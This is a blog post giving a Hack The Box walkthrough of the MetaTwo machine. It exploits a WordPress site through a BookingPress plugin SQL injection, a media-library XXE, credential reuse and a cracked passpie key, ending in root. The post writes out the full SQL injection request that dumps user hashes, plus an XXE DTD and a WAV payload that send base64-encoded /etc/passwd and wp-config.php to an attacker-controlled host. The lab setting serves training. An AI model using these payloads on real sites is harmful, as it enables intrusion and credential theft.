---
layout: post
title: "MetaTwo"
date: 2023-05-02
categories: [HTB, machine-easy-htb]
image: /assets/img/HTB/easy/MetaTwo/MetaTwo.png
---
> MetaTwo Machine involves hacking wordpress by exploit vulnerable wordpress plugin called bookingpress with unathenticated sql injection and with it, you can login with user into wordpress but that user is not an admin and in media section after login, there is library with an issue to parse XML file and with it having an issue, i can do XML injection by reading files of servers and with read one of file, i got access to ftp server and login with it and got credentials of ssh to user called jnelson.Inside the server, there is program that was running before called passpie in which it save credentials in different form and After cracking credentials found,i got login as root

# Enumeration
- Starting scanning for ports

```
rustscan -a $IP --ulimit 5000 --tries 5 -t 2000 --scan-order Random -b 2500 -- -vvv -Pn -sC -sV -oN nmap.txt
```
- Output

```
# Nmap 7.93 scan initiated Fri Feb 10 03:09:19 2023 as: nmap -vvv -p 21,80,22 -vvv -Pn -sC -sV -oN nmap.txt 10.10.11.186
Nmap scan report for 10.10.11.186
Host is up, received user-set (0.45s latency).
Scanned at 2023-02-10 03:09:19 EST for 242s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp?    syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPp9LmBKMOuXu2ZOpw8JorL5ah0sU0kIBXvJB8LX26rpbOhw+1MPdhx6ptZzXwQ8wkQc88xu5h+oB8NGkeHLYhvRqtZmvkTpOsyJiMm+0Udbg+IJCENPiKGSC5J+0tt4QPj92xtTe/f7WV4hbBLDQust46D1xVJVOCNfaloIC40BtWoMWIoEFWnk7U3kwXcM5336LuUnhm69XApDB4y/dt5CgXFoWlDQi45WLLQGbanCNAlT9XwyPnpIyqQdF7mRJ5yRXUOXGeGmoO9+JALVQIEJ/7Ljxts6QuV633wFefpxnmvTu7XX9W8vxUcmInIEIQCmunR5YH4ZgWRclT+6rzwRQw1DH1z/ZYui5Bjn82neoJunhweTJXQcotBp8glpvq3X/rQgZASSyYrOJghBlNVZDqPzp4vBC78gn6TyZyuJXhDxw+lHxF82IMT2fatp240InLVvoWrTWlXlEyPiHraKC0okOVtul6T0VRxsuT+QsyU7pdNFkn2wDVvC25AW8=
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB1ZmNogWBUF8MwkNsezebQ+0/yPq7RX3/j9s4Qh8jbGlmvAcN0Z/aIBrzbEuTRf3/cHehtaNf9qrF2ehQAeM94=
|   256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOP4kxBr9kumAjfplon8fXJpuqhdMJy2rpd3FM7+mGw2
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=2/10%Time=63E5FBBB%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 10 03:13:21 2023 -- 1 IP address (1 host up) scanned in 242.67 seconds
```
- We have port 21,22 and 80

## FTP ENUMERATION
- Check for anonymous access on box but we cannot login as Anonymous

```
┌──(blackninja㉿arena)-[~/CTF/HTB/MetaTwo]
└─$ ftp anonymous@10.10.11.186                                                                     
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

## HTTP ENUMERATION
- Before everything,open burpsuite with your browser being setting up with it.
- When we paste 10.10.11.186, we got redirect to metapress.htb then we add domain in /etc/hosts.
- When navigate to metapress.htb, we met with wordpress site and there is launch event and we are given a link

![wordpress dashboard](/assets/img/HTB/easy/MetaTwo/web.png)
- When we will follow link and observe burpsuite, we see name of plugin being exposed that was used in that events

![plugin Name Exposed](/assets/img/HTB/easy/MetaTwo/plugin.png)
- When naviagate to wp-content/plugins/bookingpress-appointment-booking/, we met with blank page
- Bruteforce for files, we can see /readme.txt and /log/

![](/assets/img/HTB/easy/MetaTwo/pluginffuf.png)
- Read readme.txt,version of bookingpress-appointment-booking being 1.0.10

![](/assets/img/HTB/easy/MetaTwo/pluginversion.png)
- Google online,i found that i can exploit it with sql injection and without authenticated

![](/assets/img/HTB/easy/MetaTwo/onlinecve.png)
- Since this plugin i see when i explore for events, we need explore a little bit.First we select service called Startup Meeting within Category called Event.

![](/assets/img/HTB/easy/MetaTwo/categories.png)
- After select Startup Meeting, i can select time slot if it is Morning,Afternoon or Evening with their Corresponding time in which i would choose 10.00 - 10.30

![](/assets/img/HTB/easy/MetaTwo/date.png)
- In next stage, i need to fill basic detail with first name,last name, email address, phone number and Note

![](/assets/img/HTB/easy/MetaTwo/details.png)

- Navigate to summary, you will see summary of what you just fill and when we book appointment, we got a thank you page

![](/assets/img/HTB/easy/MetaTwo/thank.png)

- Read exploit from https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 and it state that this plugin that have Action 'bookingpress_front_get_category_services' fails to properly sanitize user supplied POST data in which in example parameter seems to be total_service
- Before we test, there is parameter '_wpnonce' to be replace by navigate to your previos created appointment in burpsuite and in my case,it is cdded94d07

![](/assets/img/HTB/easy/MetaTwo/wpnonce.png)
- Try in box and in need it is vulnerable to Unauthenticated sql injection 

![](/assets/img/HTB/easy/MetaTwo/poc.png)
- After we get something, we can look for structure of database of wordpress and dump credentials of users

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
Content-Length: 208
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://metapress.htb
Referer: http://metapress.htb/events/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1676199208%7CoQZn1zwnqMkZMq9biisdOllGeem0lenD8AVUX3hJVEw%7C485d55dde9e53e3e174faa6770549d9c25969aa3047ad466d516e9c8ecfea840; PHPSESSID=3nnu55ipri337im7a781kp8voh; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1676199208%7CoQZn1zwnqMkZMq9biisdOllGeem0lenD8AVUX3hJVEw%7C37ed97502b0bda73e2fdc235b484a9c21ef8e42346da8336693be1e975944e34; wp-settings-2=mfold%3Do; wp-settings-time-2=1676026409
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=cdded94d07&category_id=1&total_service=-7502)+UNION+ALL+SELECT+user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL+from+wp_users+limit+10--+-
```

- OUTPUT

![](/assets/img/HTB/easy/MetaTwo/wpdbs.png)
- Since we have hashes, we can use advantage of hashcat as it detect hash in automode by save hashed to file called hash.txt

![](/assets/img/HTB/easy/MetaTwo/detecthash.png)
- Then we crack it with hashcat, we got manager password

```
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```
- Output

![](/assets/img/HTB/easy/MetaTwo/managerpass.png)
- Use it in wordpress, we can successful login as manager and see 3 menus which are Dashboard,Media and Profile

![](/assets/img/HTB/easy/MetaTwo/managerdashboard.png)
- After some enumeration by looking reuse of passwords, enumerate wordpress for users,configs and everything, i came across that even version of wordpress.You check manually or you can use wpscan.for this case,i will use wpscan

```
wpscan --url http://metapress.htb/
```
- Output

![](/assets/img/HTB/easy/MetaTwo/wpversion.png)
- Google around for exploit of version, i came across https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/ in which wordpress version 5.7, 5.6.2, 5.6.1, 5.6, 5.0.11 have ID3 library to parse information about an audio file uploaded in the Media Library that was vulnerable to XXE

![](/assets/img/HTB/easy/MetaTwo/onlinecve2.png)
- Prepare Our environment according to cve we just read from https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/ in which i basically need to create two files which are evil.dtd and payload.wav and also hosted website
- STEP ONE:

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://attacker/?p=%file;'>" >
```
- STEP TWO:

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://attacker/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

![](/assets/img/HTB/easy/MetaTwo/cveprepare.png)
- Then we upload our payload.wav

![](/assets/img/HTB/easy/MetaTwo/payloadupload.png)
- Go back to our servers, we can see that it got executed

![](/assets/img/HTB/easy/MetaTwo/payloadexecuted.png)
- Decode base64, we got /etc/passwd from server

![](/assets/img/HTB/easy/MetaTwo/base64decode.png)

- Read wp-config.php as we did for /etc/passwd but first change evil.dtd to be like this

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.81/?p=%file;'>" >
```
- After that, payload executed

![](/assets/img/HTB/easy/MetaTwo/payloadexecuted2.png)
- Decode base64 strings, we got passwords for databases and ftp

![](/assets/img/HTB/easy/MetaTwo/base64decode2.png)
- We got authenticated in  ftp as user metapress.htb

![](/assets/img/HTB/easy/MetaTwo/ftplogin.png)
- Look around, we found send_email.php in which it contain credentials of user jnelson

![](/assets/img/HTB/easy/MetaTwo/getcreds.png)
- Credentials are seen as you read the file

![](/assets/img/HTB/easy/MetaTwo/getcreds2.png)
- With credentials, we successful login as user jnelson and we got user flag

![](/assets/img/HTB/easy/MetaTwo/loginssh.png)
- In home directory of user, i can see hidden folder called passpie, we can see .config,.keys,ssh but when try to check .keys i can see public and private

![](/assets/img/HTB/easy/MetaTwo/passpie2.png)
- Navigate to ssh,i can see two files which are jnelson.pass and root.pass

![](/assets/img/HTB/easy/MetaTwo/passpie.png)
- There is tool called passpie that used to manage passwords in terminal so that mean that we have root.pass but pgp format then we need to understand and i will start with help in which command called export will be used to expose credentials in plaintext

![](/assets/img/HTB/easy/MetaTwo/passpieunderstand.png)
- Understand command export in which it does and we need to specify options and filepath

![](/assets/img/HTB/easy/MetaTwo/passpieunderstand2.png)
- Copy root.pass to /tmp so as not spoil fun for others and try to export password in plaintext and it require password

![](/assets/img/HTB/easy/MetaTwo/passpiepass.png) 
- We copy private keys from .keys and crack with john after convert it to hash (format john could understand) from pgp format and we got password

![](/assets/img/HTB/easy/MetaTwo/crackjohn.png)
- Pass as passphrase, we got what seems to be root password

![](/assets/img/HTB/easy/MetaTwo/getcreds3.png)
- When try to login, i got root access and hence we got root flag

![](/assets/img/HTB/easy/MetaTwo/root.png)

![](/assets/img/HTB/easy/MetaTwo/pwned.png)
